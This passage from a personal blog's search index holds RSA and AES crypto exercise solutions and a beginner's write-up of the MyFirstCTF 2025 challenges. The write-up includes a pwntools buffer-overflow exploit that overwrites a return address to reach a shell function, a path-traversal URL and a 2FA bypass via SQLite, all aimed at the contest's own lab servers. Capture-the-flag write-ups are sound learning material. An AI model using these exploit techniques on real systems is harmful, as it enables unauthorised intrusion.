1:<br>        a = i<br>        break<br>print(pow(a,(p+1)//4,p))<br></code></pre></td></tr></table></figure><h1 id="Symmetric-Cryptography"><a href="#Symmetric-Cryptography" class="headerlink" title="Symmetric Cryptography"></a>Symmetric Cryptography</h1><h2 id="Keyed-Permutations"><a href="#Keyed-Permutations" class="headerlink" title="Keyed Permutations"></a>Keyed Permutations</h2><p><img src="https://hackmd.io/_uploads/B15shghqJg.png" alt="image"></p><h2 id="Resisting-Bruteforce"><a href="#Resisting-Bruteforce" class="headerlink" title="Resisting Bruteforce"></a>Resisting Bruteforce</h2><p><img src="https://hackmd.io/_uploads/r12Fnx391l.png" alt="image"></p><h2 id="Structure-of-AES"><a href="#Structure-of-AES" class="headerlink" title="Structure of AES"></a>Structure of AES</h2><p>前面兩題都是在講簡單的概念，這題要你知道AES的原理以及怎麼去做加密的，<br>總共有四個步驟：<br>(PS：題目有附影片看下面講得會借用圖片來解釋：<a href="https://www.youtube.com/watch?v=gP4PqVGudtg">https://www.youtube.com/watch?v=gP4PqVGudtg</a>)</p><ol><li>SubBytes（字節代換）</li><li>ShiftRows（行位移）</li><li>MixColumns（列混合）</li><li>AddRoundKey（輪密鑰加）</li></ol><p><img src="https://hackmd.io/_uploads/BkdDAVh91l.png" alt="image"></p><p>左邊輸入，右邊是鑰匙<br><img src="https://hackmd.io/_uploads/Hyq_64h9kx.png" alt="image"></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><h2 id="1-Modular-Exponentiation"><a href="#1-Modular-Exponentiation" class="headerlink" title="1. Modular Exponentiation"></a>1. Modular Exponentiation</h2><p><img src="https://hackmd.io/_uploads/ryQAQ4feJg.png" alt="image"></p><p><strong>Solution</strong></p><p>題目要求使用mod，將101¹⁷ mod 22663</p><blockquote><p>pow(base, exponent, modulus)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pyton">b = 101<br>e = 17<br>m = 22663<br>print(pow(b,e,m))<br></code></pre></td></tr></table></figure><h2 id="2-Public-Keys"><a href="#2-Public-Keys" class="headerlink" title="2. Public Keys"></a>2. Public Keys</h2><p><img src="https://hackmd.io/_uploads/SkYvxIMeyx.png" alt="image"></p><p><strong>Solution</strong></p><p>題目要求我們將12加密，並給了我們Keyp&#x3D;17、q&#x3D;23、e&#x3D;65537</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pyton">p=17<br>q=23<br>e=65537<br>n = p*q<br>m = 12<br>print(pow(m,e,n))<br></code></pre></td></tr></table></figure><h2 id="3-Euler’s-Totient"><a href="#3-Euler’s-Totient" class="headerlink" title="3. Euler’s Totient"></a>3. Euler’s Totient</h2><p><img src="https://hackmd.io/_uploads/H1Lj7Lfe1g.png" alt="image"></p><p><strong>Solution</strong></p><p>給了 P和Q兩個質數，要求帶入歐拉函式算出N</p><p>p &#x3D; 857504083339712752489993810777<br>q &#x3D; 1029224947942998075080348647219</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pyton">p = 857504083339712752489993810777<br>q = 1029224947942998075080348647219<br><br>print((p-1)*(q-1))<br></code></pre></td></tr></table></figure><p>歐拉函式：<a href="https://zh.wikipedia.org/zh-tw/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0">https://zh.wikipedia.org/zh-tw/%E6%AC%A7%E6%8B%89%E5%87%BD%E6%95%B0</a></p><h2 id="4-Private-Keys"><a href="#4-Private-Keys" class="headerlink" title="4. Private Keys"></a>4. Private Keys</h2><p><img src="https://hackmd.io/_uploads/BkNkBIfgJe.png" alt="image"></p><p><strong>Solution</strong></p><p>求私鑰 d，<br><img src="https://hackmd.io/_uploads/S1prD8fe1l.png" alt="image"></p><p><img src="https://hackmd.io/_uploads/H16IDIGxkg.png" alt="image"></p><p>p &#x3D; 857504083339712752489993810777<br>q &#x3D; 1029224947942998075080348647219<br>e &#x3D; 65537</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pyton">p = 857504083339712752489993810777       <br>q = 1029224947942998075080348647219<br>e = 65537<br>n = (p-1)*(q-1)<br>print(pow(e,-1,n))<br></code></pre></td></tr></table></figure><p>數論倒數：<a href="https://www.youtube.com/watch?v=C7Kuo0e9s6Y">https://www.youtube.com/watch?v=C7Kuo0e9s6Y</a></p><h2 id="5-RSA-Decryption"><a href="#5-RSA-Decryption" class="headerlink" title="5. RSA Decryption"></a>5. RSA Decryption</h2><p><img src="https://hackmd.io/_uploads/Hk0vydfe1g.png" alt="image"></p><p><strong>Solution</strong></p><p>與上一題結合，解密密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pyton">key = 121832886702415731577073962957377780195510499965398469843281<br>n = 882564595536224140639625987659416029426239230804614613279163<br>e = 65537<br>c = 77578995801157823671636298847186723593814843845525223303932<br><br>p = 857504083339712752489993810777<br>q = 1029224947942998075080348647219<br><br>pq = (p-1) * (q-1)<br>d = pow(e,-1,pq)<br><br>print(pow(c,d,n))<br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MyFirstCTF 2025</title>
    <link href="/Nineday.github.io/2025/09/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
    <url>/Nineday.github.io/2025/09/11/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="2025-My-First-CTF"><a href="#2025-My-First-CTF" class="headerlink" title="2025 My First CTF"></a>2025 My First CTF</h1><p>第一次參加，把有做出來的題目丟在這邊(雖然才3題)。</p><h2 id="h2Last-score"><a href="#h2Last-score" class="headerlink" title="h2Last score"></a>h2Last score</h2><p><img src="https://hackmd.io/_uploads/HkllyvJzll.png" alt="image"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h3><p><img src="https://hackmd.io/_uploads/HkW79d1Gll.png" alt="image"><br>簽到題，有防Ctrl+c的機制，<del>所以我直接手打</del></p><h3 id="Ramen-CTF"><a href="#Ramen-CTF" class="headerlink" title="Ramen CTF"></a>Ramen CTF</h3><p><img src="https://hackmd.io/_uploads/B1r3qukGxg.png" alt="image"><br>這題給了一張圖片，要求找到店家跟點的菜名(<del>有人直接拿去對獎但我沒想到這招</del>)<br>這題我的解法是把賣家統編拿去財政部查，可是不知道為什麼查不到，最後是Chat GPT 查到的。</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="A-simple-snake-game"><a href="#A-simple-snake-game" class="headerlink" title="A_simple_snake_game"></a>A_simple_snake_game</h3><p><img src="https://hackmd.io/_uploads/SkrdTwkfgl.png" alt="image"><br>這題給了你一個貪吃蛇小遊戲，要你贏得這遊戲(後面REVIEW了才發現連HP也要一起改)。<br>解題過程如下：</p><h3 id="解題過程"><a href="#解題過程" class="headerlink" title="解題過程"></a>解題過程</h3><p>打開檔案看到一個執行檔跟其他的應用檔案。<br><img src="https://hackmd.io/_uploads/r1b3TPkzge.png" alt="image"><br>執行後是一個遊戲，上下左右移動，吃掉方塊可以增加分數(<del>就很一般的貪吃蛇</del>)。<br>看到這邊就下意識地用Cheat Engine<br>但發現這隻笨蛇死掉時間我都來不及幫它加血量(<del>爛蛇</del>)<br>結果Enter可以暫停(這個是超出出題者範圍的操作)</p><hr><p>這題有兩個問題點：</p><blockquote><ol><li>HP要怎麼查</li><li>溢位</li></ol></blockquote><p>1.HP問題<br>因為沒有給CODE，這邊我猜測要用3去排除才能找到HP(前面試過2但都找不到)<br><img src="https://hackmd.io/_uploads/rJFNgd1zxe.png" alt="image"><br>接著再把笨蛇-1HP，再改2去搜尋。<br><img src="https://hackmd.io/_uploads/ryJheuyfgg.png" alt="image"><br>在移動時就會發現有一個變數在移動時會改變，這樣我們就找到HP了。</p><hr><p>2.Score 怎麼找<br>會找HP的話，Score也就差不多樣子(沒什麼特別的)<br>就一樣吃方塊去排除慢慢找就好。</p><hr><p>3.關於溢位<br>因為不知道通關的要求是多少(所以直接9999大法給他<del>弄到溢位就完事</del>)<br><code>補充:我在REVIEW時測試過當超過10位數時會溢位，</code></p><hr><p>最後把兩個弄到溢位，FLAG就出來了。(FLAG會出現在下方Score跟HP欄位)<br><img src="https://hackmd.io/_uploads/ryL2M_1Geg.png" alt="image"></p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p><img src="https://hackmd.io/_uploads/rJHJlznzgl.png" alt="image"><br>這題是一個我覺得蠻經典的BOF題型<br><img src="https://hackmd.io/_uploads/ry9FgG2fll.png" alt="image"><br>這邊會先判斷yes or no<br>接著再<code>int8 = read_int8();</code><br>從上面可以看到上限是143，但如果這邊輸入-1的話上限會變成255<br>接著再翻了一下Fuctions後看到這邊可以提SHELL，所以我們可以知道這題要ＢＯＦ接著就去算要多少能覆蓋就好。<br><img src="https://hackmd.io/_uploads/rJ8d-G3zxg.png" alt="image"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&#x27;chals1.ais3.org&#x27;</span>, <span class="hljs-number">60611</span>)<br>r.sendline(<span class="hljs-string">b&quot;yes&quot;</span>)<br>r.sendline(<span class="hljs-string">b&quot;-1&quot;</span>)<br>welcome_func = <span class="hljs-number">0x401256</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">168</span>+p64(welcome_func)<br><br><span class="hljs-built_in">print</span>(r.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>,payload))<br>r.interactive()<br><br><br></code></pre></td></tr></table></figure><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Tomorin-db-🐧"><a href="#Tomorin-db-🐧" class="headerlink" title="Tomorin db 🐧"></a>Tomorin db 🐧</h3><p><img src="https://hackmd.io/_uploads/SyZBnwVMxe.png" alt="image"><br>這題給了一個網站，題目敘述很誠實地說她把FLAG放在網站上。<br>(然後就有人以為是隱寫術一直在看圖片……)<br>這題按下FLAG的時候會被強制去聽MYGO。</p><blockquote><p>下面可以看到是怎麼做到的</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">package main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;net/http&quot;</span><br><br>func main() &#123;<br>http.Handle(<span class="hljs-string">&quot;/&quot;</span>, http.FileServer(http.Dir(<span class="hljs-string">&quot;/app/Tomorin&quot;</span>)))<br>http.HandleFunc(<span class="hljs-string">&quot;/flag&quot;</span>, func(w http.ResponseWriter, r *http.Request) &#123;<br>http.Redirect(w, r, <span class="hljs-string">&quot;https://youtu.be/lQuWN0biOBU?si=SijTXQCn9V3j4Rl6&quot;</span>, http.StatusFound)<br>  &#125;)<br>  http.ListenAndServe(<span class="hljs-string">&quot;:30000&quot;</span>, nil)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>這題只要做Path Traversal就可以了。<br><a href="http://chals1.ais3.org:30000/..%2F../flag">http://chals1.ais3.org:30000/..%2F../flag</a> &#x3D; <a href="http://chals1.ais3.org:30000/flag">http://chals1.ais3.org:30000/flag</a><br><del>非常簡單</del>(到底誰以為是隱寫術)</p><h3 id="Login-Screen-1"><a href="#Login-Screen-1" class="headerlink" title="Login Screen 1"></a>Login Screen 1</h3><p><img src="https://hackmd.io/_uploads/HkWtxRtfex.png" alt="image"><br>這題要你去做admin登入<br>解題過程：<br>先做一次guest的登入之後用SQLite把二次驗證碼抓出來後再登入FLAG就出來了。<br><img src="https://hackmd.io/_uploads/HyYueRFMee.png" alt="image"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/Nineday.github.io/2025/09/11/hello-world/"/>
    <url>/Nineday.github.io/2025/09/11/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
